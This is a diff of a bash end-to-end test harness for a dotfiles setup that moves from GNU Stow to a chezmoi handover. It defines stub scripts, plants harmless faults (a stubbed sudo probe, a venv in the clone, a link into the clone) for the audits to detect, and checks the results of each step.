+cl_out=$(HOME=$CL E2E_CLONE=$CL/dotfiles E2E_SRC=$UNIT/no-src E2E_SNAPSHOT_PRUNE='' e2e_audit_clone_links) ||
+    fail "the clone-link audit failed a home without links into the clone: $cl_out"
+expect_eq 'no clone links' "$cl_out" ''
+
+# The sync-runtime guard: the first step after which the clone holds the
+# AI-sync runtime directory (or a link at its name) is recorded, once.
+venv_got=$(
+    HOME="$UNIT/venv home" E2E_CLONE="$UNIT/venv clone"
+    mkdir -p "$HOME" "$E2E_CLONE"
+    e2e_guard_before
+    e2e_guard_after clone setup:clone
+    e2e_guard_before
+    mkdir "$E2E_CLONE/$E2E_SYNC_VENV"
+    e2e_guard_after apply-1 setup:apply-1
+    e2e_guard_before
+    e2e_guard_after apply-2 setup:apply-2
+    printf '%s\n' "$E2E_VENV_VIOLATIONS"
+)
+expect_eq 'sync runtime guard' "$venv_got" 'apply-1 (setup:apply-1)'
+venv_got=$(
+    HOME="$UNIT/venv home" E2E_CLONE="$UNIT/venv link clone"
+    mkdir -p "$E2E_CLONE"
+    e2e_guard_before
+    ln -s /nonexistent "$E2E_CLONE/$E2E_SYNC_VENV"
+    e2e_guard_after payloads setup:payloads
+    printf '%s\n' "$E2E_VENV_VIOLATIONS"
+)
+expect_eq 'sync runtime guard sees a dangling link' "$venv_got" 'payloads (setup:payloads)'
+printf 'ok: handover end state, clone links and the sync-runtime guard\n'
 
 # --- part two: the sandboxed dry run -------------------------------------
 
-# The fixture source checkout: stubs for the three entry points inside.sh
-# drives, and the tracked ~/.zshrc the stow stub links. Two commits: the
-# second plants a sudo in doctor.sh outside any human phase.
+# The fixture source checkout: stubs for the entry points inside.sh drives,
+# the chezmoi stub S4-chezmoi installs, the clone's own docs/bootstrap.md
+# (native-handover extracts the Fresh home by hand functions from it), a
+# .chezmoiroot and the .gitignore line that hides the AI-sync runtime. Four
+# commits: the clean one, then three plants, each built on the clean files:
+# a sudo in doctor.sh outside any human phase, a setup-host.sh that creates
+# that runtime in the clone, and a chezmoi whose first file apply also links
+# a home path into the clone.
 SRC="$TEST_TMP/src"
 TEST_BIN="$TEST_TMP/bin"
-mkdir -p "$SRC/common/zsh" "$TEST_BIN"
+mkdir -p "$SRC/docs" "$SRC/fixture" "$SRC/scripts" "$SRC/tests" "$TEST_BIN"
 cat >"$TEST_TMP/gitconfig" <<EOF
 [user]
 	name = Fixture
@@ -721,26 +1069,30 @@ cat >"$TEST_TMP/gitconfig" <<EOF
 	detachedHead = false
 EOF
 export GIT_CONFIG_GLOBAL="$TEST_TMP/gitconfig" GIT_CONFIG_NOSYSTEM=1
-printf '# tracked zshrc\n' >"$SRC/common/zsh/.zshrc"
+cp "$REPO_ROOT/docs/bootstrap.md" "$SRC/docs/bootstrap.md"
+printf 'home\n' >"$SRC/.chezmoiroot"
+printf '/.venv-sync/\n' >"$SRC/.gitignore"
+write_chezmoi_stub "$SRC/fixture/chezmoi"
 
-# The setup-host.sh stub keeps the real one's shape: the root and WSL
-# refusals (exit 2), plan lines, the HUMAN blocks of docs/bootstrap.md with
-# the real frames, the pending line on stderr and exit 3 while a blocking
-# step is pending. Its state is what the blocks leave behind: the apt
-# marker the apt-get stub writes, ~/.local/bin/claude from the gated
-# installer, the ~/.zshrc link from stow-all.sh. --check writes nothing.
+# The setup-host.sh stub keeps the real one's native shape: no mode flag
+# (an unknown argument, a legacy one included, is exit 2), the root and WSL
+# refusals (exit 2), plan lines, the HUMAN blocks with the real frames, the
+# pending line on stderr and exit 3 while a blocking step is pending. Its
+# state is what the blocks and the handover leave behind: the apt marker the
+# apt-get stub writes, ~/.local/bin/claude from the gated installer, the
+# chezmoi it installs from the clone once claude is done (so one run applies
+# that and leaves only H7-native), and the home binding of the handover.
+# --check writes nothing.
 cat >"$SRC/setup-host.sh" <<'SH'
 #!/bin/bash
 # e2e-harness fixture: a setup-host.sh stand-in (see tests/e2e-harness.sh).
 set -u
-host='' mode=check legacy=0 only=''
+host='' mode=check
 while [ $# -gt 0 ]; do
     case $1 in
         --host) host=$2; shift ;;
         --check) mode=check ;;
         --yes) mode=apply ;;
-        --legacy-stow) legacy=1 ;;
-        --only) only=$2; shift ;;
         *) printf '[dotfiles] [error] unknown argument: %s\n' "$1" >&2; exit 2 ;;
     esac
     shift
@@ -750,7 +1102,7 @@ if [ "$(id -u)" = 0 ] || [ "${E2E_STUB_ROOT:-}" = 1 ]; then
     exit 2
 fi
 if [ -z "$host" ]; then
-    printf '%s\n' '[dotfiles] [error] ./stow-all.sh recorded a common-only install for this home (no host overlay); setup-host needs one: pass --host HOST' >&2
+    printf '%s\n' '[dotfiles] [error] the native config of this home selects [data].host common-only (no host overlay); setup-host needs one: pass --host HOST' >&2
     exit 2
 fi
 case $host in
@@ -761,18 +1113,8 @@ case $host in
         ;;
     *) printf '[dotfiles] [error] unknown host: %s\n' "$host" >&2; exit 2 ;;
 esac
-if [ "$legacy" = 0 ]; then
-    [ "$only" = S4-chezmoi ] || { printf 'native stub requires --only S4-chezmoi\n' >&2; exit 2; }
-    if [ "$mode" = apply ]; then
-        mkdir -p "$HOME/.local/bin"
-        printf '#!/bin/sh\nprintf "chezmoi version v2.74.0\\n"\n' >"$HOME/.local/bin/chezmoi"
-        chmod 755 "$HOME/.local/bin/chezmoi"
-    fi
-    [ -x "$HOME/.local/bin/chezmoi" ] || exit 3
-    printf 'S4-chezmoi done chezmoi 2.74.0\n'
-    exit 0
-fi
 root=$(cd "$(dirname "$0")" && pwd -P)
+# PLANT-VENV
 scratch=$HOME/.cache/dotfiles-bootstrap
 installer=$scratch/claude/install.sh
 if command -v sha256sum >/dev/null 2>&1; then
@@ -782,17 +1124,23 @@ else
     verify='shasum -a 256 -c --status -'
     digest() { shasum -a 256 <"$1" | cut -d ' ' -f 1; }
 fi
-apt_done=0 claude_done=0 stowed=0 omz=0
+apt_done=0 claude_done=0 omz=0 cz=0 native=0
 [ ! -f "$scratch/apt-core.done" ] || apt_done=1
 [ ! -x "$HOME/.local/bin/claude" ] || claude_done=1
-[ ! -L "$HOME/.zshrc" ] || stowed=1
 [ ! -f "$HOME/.oh-my-zsh/oh-my-zsh.sh" ] || omz=1
+[ ! -x "$HOME/.local/bin/chezmoi" ] || cz=1
+marker=$HOME/.config/dotfiles/native config=$HOME/.config/chezmoi/chezmoi.toml
+if [ -f "$marker" ] && [ ! -L "$marker" ] && [ -f "$config" ] && [ ! -L "$config" ] &&
+    [ ! -e "$HOME/.config/dotfiles/maintenance" ] &&
+    [ "$(cat "$marker")" = "$(printf '%s\n%s\n%s' dotfiles-chezmoi-v1 "$(cd "$HOME" && pwd -P)" "$root")" ]; then
+    native=1
+fi
 held=''
 printf 'P0-preflight done host %s, profile debian, checkout %s\n' "$host" "$root"
 if [ "$apt_done" = 1 ]; then
-    printf '%s\n' 'H1-apt-core done 2 apt packages installed'
+    printf '%s\n' 'H1-apt-core done 1 apt package installed'
 else
-    printf '%s\n' 'H1-apt-core human missing apt packages: zsh stow'
+    printf '%s\n' 'H1-apt-core human missing apt packages: zsh'
     held=H1-apt-core
 fi
 if [ "$apt_done" = 0 ]; then
@@ -805,6 +1153,19 @@ elif [ "$mode" = apply ]; then
     omz=1
 else
     printf '%s\n' 'S3-clones todo clone oh-my-zsh'
+fi
+if [ "$cz" = 1 ]; then
+    printf 'S4-chezmoi done chezmoi 2.74.0 at %s/.local/bin/chezmoi\n' "$HOME"
+elif [ "$apt_done" = 0 ]; then
+    printf '%s\n' 'S4-chezmoi todo blocked by H1-apt-core: chezmoi is not installed'
+elif [ "$claude_done" = 0 ]; then
+    printf '%s\n' 'S4-chezmoi todo waiting for S5-claude (this stub): chezmoi is not installed'
+elif [ "$mode" = apply ]; then
+    mkdir -p "$HOME/.local/bin" && cp "$root/fixture/chezmoi" "$HOME/.local/bin/chezmoi" &&
+        chmod 755 "$HOME/.local/bin/chezmoi" || exit 1
+    printf '%s\n' 'S4-chezmoi done applied: install chezmoi 2.74.0'
+else
+    printf '%s\n' 'S4-chezmoi todo install chezmoi 2.74.0'
 fi
 if [ "$claude_done" = 1 ]; then
     printf 'S5-claude done claude at %s/.local/bin/claude\n' "$HOME"
@@ -820,20 +1181,17 @@ else
     printf '%s\n' 'S5-claude human Claude Code is not installed; its vendor installer is read by a person first'
     held="$held${held:+ }S5-claude"
 fi
-if [ "$stowed" = 1 ]; then
-    printf 'H7-stow done %s/.zshrc links into %s/common\n' "$HOME" "$root"
-elif [ "$omz" = 0 ] || [ "$claude_done" = 0 ]; then
-    printf '%s\n' 'H7-stow human blocked by S5-claude: not a stow link yet'
-    held="$held${held:+ }H7-stow"
+if [ "$native" = 1 ]; then
+    printf '%s\n' 'H7-native done native binding and local config present; configuration review remains an operator step'
 else
-    printf 'H7-stow human %s/.zshrc is not a stow link yet; 2 home file(s) to move aside first: .bashrc .profile\n' "$HOME"
-    held="$held${held:+ }H7-stow"
+    printf '%s\n' 'H7-native human follow docs/chezmoi-migration/takeover.md to initialize and hand over this home'
+    held="$held${held:+ }H7-native"
 fi
 printf '%s\n' 'H7-auth human sign in to GitHub, Claude Code and Codex (not checked offline)' \
     'H7-doctor human the completion gate is ./doctor.sh --host lab-ubuntu'
 if [ "$apt_done" = 0 ]; then
     printf '%s\n' 'HUMAN-BEGIN H1-apt-core sudo' '# docs/bootstrap.md H1-apt-core' 'sudo apt-get update' \
-        'sudo apt-get install -y --no-install-recommends zsh stow' 'HUMAN-END'
+        'sudo apt-get install -y --no-install-recommends zsh' 'HUMAN-END'
 elif [ "$claude_done" = 0 ]; then
     printf '%s\n' 'HUMAN-BEGIN S5-claude inspect' '# docs/bootstrap.md S5-claude'
     if [ -f "$installer" ]; then
@@ -845,21 +1203,11 @@ elif [ "$claude_done" = 0 ]; then
         printf '# ./setup-host.sh --host %s (without --check) downloads https://claude.ai/install.sh (unpinned)\n' "$host"
     fi
     printf '%s\n' '# ./doctor.sh then checks the installed claude against tools.tsv' 'HUMAN-END'
-elif [ "$stowed" = 0 ]; then
-    printf '%s\n' 'HUMAN-BEGIN H7-stow judgment' '# docs/bootstrap.md H7-stow' \
-        '# Stow never replaces these files and stow --adopt would overwrite the tracked copies, so move each aside;'
-    for rel in .bashrc .profile; do
-        [ -f "$HOME/$rel" ] && [ ! -L "$HOME/$rel" ] || continue
-        printf 'mv -n %q %q\n' "$HOME/$rel" "$HOME/$rel.pre-dotfiles"
-    done
-    printf '%s\n' '# writes ~/.claude, ~/.codex and ~/.ssh; an agent runs it only as one visible top-level command'
-    # The real block names the Homebrew prefix; a machine running this test
-    # may have a real stow there, which the prefix would find before the
-    # stub, so the fixture names a prefix that exists nowhere, in the %q
-    # form steps_stow_path_prefix uses for a prefix with a space (this
-    # home has one).
-    printf 'PATH=%q:"$PATH" %q %s\n' "$HOME/.e2e-stub-prefix/bin" "$root/stow-all.sh" "$host"
-    printf '%s\n' 'HUMAN-END'
+fi
+if [ "$native" = 0 ]; then
+    printf '%s\n' 'HUMAN-BEGIN H7-native judgment' '# docs/bootstrap.md H7-native' \
+        '# Follow docs/chezmoi-migration/takeover.md from this checkout.' \
+        "# Select local [data].host = $host explicitly; setup-host never initializes or applies configuration." 'HUMAN-END'
 fi
 printf '%s\n' 'HUMAN-BEGIN H7-auth auth' '# docs/bootstrap.md H7-auth' 'ssh-keygen -t ed25519' \
     'gh auth login --git-protocol ssh' 'HUMAN-END' 'HUMAN-BEGIN H7-doctor judgment' '# docs/bootstrap.md H7-doctor'
@@ -873,33 +1221,38 @@ printf '[dotfiles] [ok] setup-host: nothing blocking remains for %s\n' "$host" >
 exit 0
 SH
 
-# doctor.sh: exit 1 until the stow and the gated installer happened, 0
-# after; --tsv prints the five-column report, with a payloads row that is
-# ok once the payload-update.sh stub ran; --smoke exits like a run.
+# doctor.sh: exit 1 until the gated installer ran and the home is bound to
+# this checkout, 0 after; --tsv prints the five-column report, with a
+# native-config row and a payloads row that is ok once the
+# payload-update.sh stub ran; --smoke exits like a run. A legacy mode flag
+# is an unknown argument.
 cat >"$SRC/doctor.sh" <<'SH'
 #!/bin/bash
 # e2e-harness fixture: a doctor.sh stand-in (see tests/e2e-harness.sh).
 set -u
-tsv=0 legacy=0
+tsv=0
 for argument in "$@"; do
     case $argument in
         --tsv) tsv=1 ;;
-        --legacy-stow) legacy=1 ;;
         --host | --platform | --smoke | lab-ubuntu | other) ;;
         *) printf '[dotfiles] [error] unknown argument: %s\n' "$argument" >&2; exit 2 ;;
     esac
 done
-[ "$legacy" = 1 ] || { printf 'legacy doctor requires --legacy-stow\n' >&2; exit 2; }
 # PLANT
-claude=missing stow=missing rc=1
+root=$(cd "$(dirname "$0")" && pwd -P)
+claude=missing native=human rc=1
 [ ! -x "$HOME/.local/bin/claude" ] || claude=ok
-[ ! -L "$HOME/.zshrc" ] || stow=ok
-[ "$claude" != ok ] || [ "$stow" != ok ] || rc=0
+marker=$HOME/.config/dotfiles/native
+if [ -f "$marker" ] && [ ! -L "$marker" ] && [ -f "$HOME/.config/chezmoi/chezmoi.toml" ] &&
+    [ "$(cat "$marker")" = "$(printf '%s\n%s\n%s' dotfiles-chezmoi-v1 "$(cd "$HOME" && pwd -P)" "$root")" ]; then
+    native=ok
+fi
+[ "$claude" != ok ] || [ "$native" != ok ] || rc=0
 if [ "$tsv" = 1 ]; then
     printf 'status\tid\ttier\tdetail\tfix\n'
     printf 'ok\tgit\tcore\t2.43.0\t-\n'
     printf '%s\tclaude\tai\t%s\tdocs/bootstrap.md S5-claude\n' "$claude" "$HOME/.local/bin/claude"
-    printf '%s\tstow-links\tcore\t%s/.zshrc\tdocs/bootstrap.md H7-stow\n' "$stow" "$HOME"
+    printf '%s\tnative-config\tcore\tbinding of %s\tdocs/bootstrap.md H7-native\n' "$native" "$HOME"
     if [ -f "$HOME/.local/share/e2e-payloads" ]; then
         printf 'ok\tpayloads\tai\tinstalled: kit, pymol, skills\t-\n'
     else
@@ -908,16 +1261,13 @@ if [ "$tsv" = 1 ]; then
 else
     printf '[dotfiles] [ok] core git: 2.43.0\n'
     [ "$claude" = ok ] || printf '[dotfiles] [error] ai claude: missing (docs/bootstrap.md S5-claude)\n'
-    [ "$stow" = ok ] || printf '[dotfiles] [error] core stow-links: %s/.zshrc is not a stow link (docs/bootstrap.md H7-stow)\n' "$HOME"
-    printf '[dotfiles] [info] summary: ok=1 missing=%s\n' "$((2 - (claude = ok) - (stow = ok)))" 2>/dev/null || true
+    [ "$native" = ok ] || printf '[dotfiles] [error] core native-config: no binding of %s to this checkout (docs/bootstrap.md H7-native)\n' "$HOME"
 fi
 exit "$rc"
 SH
-sed -i.bak '/summary/d' "$SRC/doctor.sh" && rm -f "$SRC/doctor.sh.bak"
 
 # scripts/payload-update.sh: --now leaves the file the doctor stub's
 # payloads row looks for, as the real installers leave their installs.
-mkdir -p "$SRC/scripts"
 cat >"$SRC/scripts/payload-update.sh" <<'SH'
 #!/bin/sh
 # e2e-harness fixture: a scripts/payload-update.sh stand-in (see tests/e2e-harness.sh).
@@ -925,35 +1275,6 @@ cat >"$SRC/scripts/payload-update.sh" <<'SH'
 mkdir -p "$HOME/.local/share" && : >"$HOME/.local/share/e2e-payloads" || exit 1
 printf '%s\n' 'payload-update: installed kit, pymol, skills'
 SH
-
-# stow-all.sh: refuses a regular ~/.bashrc or ~/.profile like Stow would,
-# calls stow (the wrapper logs it), links ~/.zshrc into the clone and
-# records the host in the state file the harness watches.
-cat >"$SRC/stow-all.sh" <<'SH'
-#!/bin/bash
-# e2e-harness fixture: a stow-all.sh stand-in (see tests/e2e-harness.sh).
-set -u
-root=$(cd "$(dirname "$0")" && pwd -P)
-host=${1:-}
-for rel in .bashrc .profile; do
-    if [ -f "$HOME/$rel" ] && [ ! -L "$HOME/$rel" ]; then
-        printf '[dotfiles] [error] Stow would conflict with %s; move it aside first\n' "$HOME/$rel" >&2
-        exit 1
-    fi
-done
-command -v stow >/dev/null 2>&1 || { printf '[dotfiles] [error] required GNU Stow is missing\n' >&2; exit 1; }
-stow -n --restow --no-folding -d "$root/common" zsh || exit 1
-ln -sfn "$root/common/zsh/.zshrc" "$HOME/.zshrc" || exit 1
-state=$(cd "$root" && git rev-parse --git-path dotfiles-sync-unix) || exit 1
-case $state in
-    /*) ;;
-    *) state=$root/$state ;;
-esac
-printf 'HOST=%s\n' "$host" >"$state" || exit 1
-printf '[dotfiles] [ok] stowed common%s\n' "${host:+ and $host}"
-exit 0
-SH
-mkdir -p "$SRC/tests"
 : >"$SRC/tests/test_chezmoi_takeover_recovery.py"
 cat >"$SRC/tests/chezmoi.sh" <<'SH'
 #!/bin/bash
@@ -963,30 +1284,49 @@ set -eu
 "$DOTFILES_TEST_CHEZMOI" --version
 printf 'isolated native fixture entrypoint stand-in\n'
 SH
-chmod +x "$SRC/setup-host.sh" "$SRC/doctor.sh" "$SRC/stow-all.sh" "$SRC/scripts/payload-update.sh"
+chmod +x "$SRC/setup-host.sh" "$SRC/doctor.sh" "$SRC/scripts/payload-update.sh"
 git -C "$SRC" init -q
 git -C "$SRC" add -A
 git -C "$SRC" commit -q -m 'stubs'
 REV_CLEAN=$(git -C "$SRC" rev-parse HEAD)
-# The planted commit: doctor.sh runs sudo on its own, in whatever phase it
-# is called, but only through this test's stub (never a real sudo).
-sed "s|^# PLANT\$|[ \"\$(command -v sudo)\" != '$TEST_BIN/sudo' ] \|\| sudo -n true|" "$SRC/doctor.sh" >"$SRC/doctor.sh.new"
-mv "$SRC/doctor.sh.new" "$SRC/doctor.sh"
-chmod +x "$SRC/doctor.sh"
-grep -F 'sudo -n true' "$SRC/doctor.sh" >/dev/null || fail 'the planted sudo did not land in doctor.sh'
-git -C "$SRC" commit -q -a -m 'plant a sudo in doctor.sh'
-REV_PLANTED=$(git -C "$SRC" rev-parse HEAD)
+# plant FILE MARKER LINE MESSAGE: every stub as it is at REV_CLEAN, then the
+# line of FILE that is exactly MARKER replaced by LINE, committed with
+# MESSAGE; prints the new commit.
+plant() {
+    git -C "$SRC" checkout -q "$REV_CLEAN" -- doctor.sh setup-host.sh fixture/chezmoi
+    E2E_PLANT_MARKER=$2 E2E_PLANT_LINE=$3 awk '
+        $0 == ENVIRON["E2E_PLANT_MARKER"] { print ENVIRON["E2E_PLANT_LINE"]; found = 1; next }
+        { print }
+        END { if (!found) exit 1 }
+    ' "$SRC/$1" >"$SRC/$1.new" || fail "the plant marker [$2] is not in $1"
+    mv "$SRC/$1.new" "$SRC/$1"
+    chmod +x "$SRC/$1"
+    git -C "$SRC" commit -q -a -m "$4"
+    git -C "$SRC" rev-parse HEAD
+}
+# The planted sudo runs on its own, in whatever phase doctor.sh is called,
+# but only through this test's stub (never a real sudo).
+REV_PLANTED=$(plant doctor.sh '# PLANT' "[ \"\$(command -v sudo)\" != '$TEST_BIN/sudo' ] || sudo -n true" 'plant a sudo in doctor.sh')
+# shellcheck disable=SC2016 # the planted lines expand in the stubs, not here
+REV_VENV=$(plant setup-host.sh '# PLANT-VENV' '[ "$mode" != apply ] || [ -e "$root/.venv-sync" ] || { mkdir -p "$root/.venv-sync" && : >"$root/.venv-sync/pyvenv.cfg"; }' 'plant a sync runtime in the clone')
+# shellcheck disable=SC2016
+REV_LINK=$(plant fixture/chezmoi '        # PLANT-LINK' '        [ -L "$home/.stow-like" ] || ln -s "$src/setup-host.sh" "$home/.stow-like" || exit 1' 'plant a link into the clone')
+if grep -F 'sudo -n true' "$SRC/doctor.sh" >/dev/null; then
+    fail 'the later plants did not restore the clean doctor.sh'
+fi
+[ -z "$(git -C "$SRC" status --porcelain)" ] || fail 'the fixture source is not clean after the plants'
 
 # The stub wrappers, in B's wrappers.log format: sudo logs and then runs
 # the command itself (there is no root here), marking it for the
-# setup-host stub's root refusal; chsh and stow log and succeed; apt-get
-# leaves the marker H1-apt-core waits for; zsh stands in for the login
-# shell and runs -c commands through bash.
+# setup-host stub's root refusal; chsh logs and succeeds; apt-get leaves the
+# marker H1-apt-core waits for; zsh stands in for the login shell and runs
+# -c commands through bash; chezmoi is the fixture's, so no chezmoi of the
+# test machine is on PATH.
 write_stub() {
     cat >"$TEST_BIN/$1"
     chmod +x "$TEST_BIN/$1"
 }
-for tool in sudo chsh stow; do
+for tool in sudo chsh; do
     write_stub "$tool" <<SH
 #!/bin/bash
 # e2e-harness stub wrapper for $tool (see tests/e2e-harness.sh).
@@ -1025,10 +1365,12 @@ done
 [ -n "$cmd" ] || exit 0
 exec bash -c "$cmd"
 SH
+write_chezmoi_stub "$TEST_BIN/chezmoi"
 
 # run_inside NAME REV HOME ENV...: inside.sh against the fixture at REV in
-# the sandbox HOME (a path with a space), with the stub bin first on PATH
-# and the login zsh pointed at the stub. Sets RUN_RC.
+# the sandbox HOME (a path with a space) holding the /etc/skel .bashrc and
+# .profile, with the stub bin first on PATH and the login zsh pointed at the
+# stub. Sets RUN_RC.
 run_inside() {
     local name=$1 rev=$2 home=$3
     shift 3
@@ -1064,8 +1406,17 @@ expect_step() {
     esac
 }
 
+# expect_one_fail NAME STEP TEXT: the run exited 1 and its only fail row is
+# STEP, holding TEXT.
+expect_one_fail() {
+    expect_eq "$1 exit" "$RUN_RC" 1
+    expect_step "$1" "$2" fail "$3"
+    expect_eq "$1 fail count" "$(awk -F '\t' '$3 == "fail"' "$TEST_TMP/out-$1/summary.tsv" | grep -c .)" 1
+}
+
 # The clean run: every step passes, the reminders are skipped once, the
-# apply loop converges in four runs and the audits see only human and
+# apply loop ends in four runs with only H7-native left, the documented
+# handover binds the home and converges, and the audits see only human and
 # negative phases.
 CLEAN_HOME="$TEST_TMP/home dir"
 run_inside clean "$REV_CLEAN" "$CLEAN_HOME"
@@ -1084,81 +1435,105 @@ fi
 expected_timeout=$(PATH="$TEST_BIN:$PATH" e2e_find_timeout && printf '%s\n' "${E2E_TIMEOUT_BIN:-none}")
 expect_eq 'clean env.txt names the timeout' "$(sed -n 's/^timeout=//p' "$CLEAN_OUT/env.txt" | sed 's|.*/||')" \
     "${expected_timeout##*/}"
+CLEAN_PHYS=$(cd -P "$CLEAN_HOME" && pwd -P)
 expect_step clean clone pass "at $CLEAN_HOME/dotfiles"
 expect_step clean doctor-initial pass 'exit 1; '
 expect_step clean doctor-initial pass 'no writes'
-expect_step clean check-nowrite pass 'exit 3; '
-expect_step clean check-nowrite pass '1 todo, 5 human; no writes'
-expect_step clean apply-1 pass 'blocks: H1-apt-core(sudo) H7-auth(auth) H7-doctor(judgment); pending: H1-apt-core S5-claude H7-stow'
+expect_step clean check-nowrite pass 'exit 3; 2 todo, 5 human; no writes'
+expect_step clean apply-1 pass 'exit 3; blocks: H1-apt-core(sudo) H7-native(judgment) H7-auth(auth) H7-doctor(judgment); pending: H1-apt-core S5-claude H7-native'
 expect_step clean H1-apt-core pass '2 line(s) run as printed (run-all)'
 expect_step clean H7-auth skip 'auth block left to the person'
 expect_step clean H7-doctor skip 'judgment block left to the person'
-expect_step clean apply-2 pass 'blocks: S5-claude(inspect) H7-auth(auth) H7-doctor(judgment); pending: S5-claude H7-stow'
+expect_step clean apply-2 pass 'exit 3; blocks: S5-claude(inspect) H7-native(judgment) H7-auth(auth) H7-doctor(judgment); pending: S5-claude H7-native'
 expect_step clean S5-claude pass '1 line(s) run as printed (run-gate)'
-expect_step clean apply-3 pass 'blocks: H7-stow(judgment) H7-auth(auth) H7-doctor(judgment); pending: H7-stow'
-expect_step clean H7-stow pass '3 line(s) run as printed (run-stow)'
-expect_step clean apply-4 pass 'exit 0 after 4 run(s)'
+expect_step clean apply-3 pass 'exit 3; applied 1 step(s); pending: H7-native'
+expect_step clean apply-4 pass 'exit 3 after 4 run(s); only H7-native pending; blocks: H7-native(judgment) H7-auth(auth) H7-doctor(judgment)'
+expect_step clean native-handover pass "native_handover lab-ubuntu exit 0; 2 earlier file(s) kept byte for byte; bound to $CLEAN_PHYS/dotfiles"
 expect_step clean second-apply pass 'exit 0, nothing applied, HOME untouched'
+expect_step clean check-done pass 'exit 0; nothing left to apply; no writes'
 expect_step clean login-shell pass 'exit 0; silent'
 expect_step clean payloads pass 'exit 0; doctor payloads ok: installed: kit, pymol, skills'
+expect_step clean native-converged pass 'empty diff; 5 managed file(s), all regular'
 expect_step clean doctor-final pass 'exit 0 from the login shell'
 expect_step clean doctor-smoke pass 'exit 0 from the login shell'
-expect_step clean native-provision pass 'S4-chezmoi'
-expect_step clean native-check pass 'no writes'
-expect_step clean native-fixtures pass 'isolated native'
 expect_step clean negative-wsl-refused pass 'exit 2: '
 expect_step clean negative-root-refused pass 'not root'
-expect_step clean audit-wrappers pass '4 wrapper call(s), all in human or negative phases'
+expect_step clean native-fixtures pass 'isolated native source/config/takeover/recovery fixtures passed'
+expect_step clean audit-wrappers pass '3 wrapper call(s), all in human or negative phases'
 expect_step clean audit-sudo-log skip 'no log/sudo.log'
-expect_step clean audit-stow-state pass 'during human:H7-stow only'
+expect_step clean audit-clone-links pass 'no link under HOME leads into the clone'
+expect_step clean audit-sync-venv pass 'never appeared in the clone'
 expect_step clean audit-login-shell pass 'login shell still '
 expect_step clean audit-rc-files pass 'human phases only'
-expect_step clean rc-files note 'changed during human:H7-stow: .bashrc .profile .zshrc'
+expect_step clean rc-files note 'changed during human:H7-native: .bashrc .profile .zshrc'
 [ "$(summary_rows clean apply-5)" = '' ] || fail 'clean: a fifth apply run happened'
-# The wrappers.log holds the two apt sudos, the stow and the root-refused
-# sudo, nothing else; the timeline frames each phase.
+# The steps run in the documented order.
+expect_eq 'clean step order' "$(awk -F '\t' '$3 != "note" && $3 != "skip" { printf "%s ", $2 }' "$CLEAN_OUT/summary.tsv")" \
+    'clone doctor-initial check-nowrite apply-1 H1-apt-core apply-2 S5-claude apply-3 apply-4 native-handover second-apply check-done login-shell payloads native-converged doctor-final doctor-smoke negative-wsl-refused negative-root-refused native-fixtures audit-wrappers audit-clone-links audit-sync-venv audit-login-shell audit-rc-files '
+# The wrappers.log holds the two apt sudos and the root-refused sudo,
+# nothing else; the timeline frames each phase.
 expect_eq 'clean wrappers.log' "$(cut -f 2,3 "$CLEAN_OUT/log/wrappers.log" | tr '\t' ' ')" 'human:H1-apt-core sudo
 human:H1-apt-core sudo
-human:H7-stow stow
 negative:root-refused sudo'
-expect_text 'clean wrappers.log argv' "$CLEAN_OUT/log/wrappers.log" "${TAB}-n ./setup-host.sh --legacy-stow --host lab-ubuntu --check"
-for phase in human:H1-apt-core human:S5-claude human:H7-stow negative:wsl-refused negative:root-refused check:doctor-initial setup:apply-1; do
+expect_text 'clean wrappers.log argv' "$CLEAN_OUT/log/wrappers.log" "${TAB}-n ./setup-host.sh --host lab-ubuntu --check"
+for phase in human:H1-apt-core human:S5-claude human:H7-native negative:wsl-refused negative:root-refused check:doctor-initial setup:apply-1 check:check-done check:native-converged; do
     expect_eq "clean timeline $phase" "$(awk -F '\t' -v p="$phase" '$3 == p { print $2 }' "$CLEAN_OUT/log/timeline" | tr '\n' ' ')" 'begin end '
 done
 awk -F '\t' '$3 ~ /^(human|negative):/ { if ($2 == "begin") b = $1; else if ($1 - b < 0) exit 1 }' "$CLEAN_OUT/log/timeline" ||
     fail 'clean: a timeline window ends before it begins'
+# The handover step's log starts with the H7-native block it stands in for.
+expect_eq 'clean handover log' "$(sed -n 1,2p "$CLEAN_OUT"/steps/*-native-handover.log)" '--- block
+# docs/bootstrap.md H7-native'
 # The outputs the contract names, and what the run left in the home.
 expect_text 'clean env.txt' "$CLEAN_OUT/env.txt" 'host=lab-ubuntu flow=unix profile=debian mode=sandbox'
 [ -f "$CLEAN_OUT/steps/01-clone.log" ] || fail 'clean: no steps/01-clone.log'
 [ -f "$CLEAN_OUT/steps/04-apply-1.blocks/1.block" ] || fail 'clean: the apply-1 blocks were not kept'
 [ -f "$CLEAN_OUT/snapshots/doctor-initial.newer" ] || fail 'clean: no doctor-initial snapshot'
 [ ! -s "$CLEAN_OUT/snapshots/doctor-initial.newer" ] || fail "clean: doctor-initial wrote in HOME: $(cat "$CLEAN_OUT/snapshots/doctor-initial.newer")"
-[ -f "$CLEAN_HOME/.bashrc.pre-dotfiles" ] && [ ! -e "$CLEAN_HOME/.bashrc" ] || fail 'clean: the mv -n lines did not move ~/.bashrc aside'
-[ -L "$CLEAN_HOME/.zshrc" ] || fail 'clean: ~/.zshrc is not the stow link'
+[ -f "$CLEAN_OUT/snapshots/check-done.newer" ] && [ ! -s "$CLEAN_OUT/snapshots/check-done.newer" ] ||
+    fail 'clean: check-done has no empty no-write snapshot'
+printf '%s\n' dotfiles-chezmoi-v1 "$CLEAN_PHYS" "$CLEAN_PHYS/dotfiles" >"$TEST_TMP/want-native"
+cmp -s "$TEST_TMP/want-native" "$CLEAN_HOME/.config/dotfiles/native" || fail 'clean: the home binding is not the documented one'
+[ -f "$CLEAN_HOME/.zshrc" ] && [ ! -L "$CLEAN_HOME/.zshrc" ] || fail 'clean: ~/.zshrc is not a regular file'
+for rel in .bashrc .profile; do
+    expect_eq "clean kept $rel" "$(cat "$CLEAN_HOME/.local/state/dotfiles-fresh-backup/$rel")" '# /etc/skel'
+done
+[ ! -e "$CLEAN_HOME/.config/dotfiles/maintenance" ] || fail 'clean: the handover left maintenance'
+[ ! -e "$CLEAN_HOME/.config/chezmoi/chezmoistate.boltdb" ] || fail 'clean: a stray state database'
 [ -x "$CLEAN_HOME/.local/bin/claude" ] || fail 'clean: the gated installer did not run'
 [ -x "$CLEAN_HOME/.local/bin/chezmoi" ] || fail 'clean: native chezmoi was not provisioned'
-[ ! -e "$CLEAN_HOME/.config/dotfiles/native" ] || fail 'clean: provisioning created a native binding in the legacy home'
 [ -f "$CLEAN_HOME/.cache/dotfiles-bootstrap/apt-core.done" ] || fail 'clean: the apt block did not run through the sudo stub'
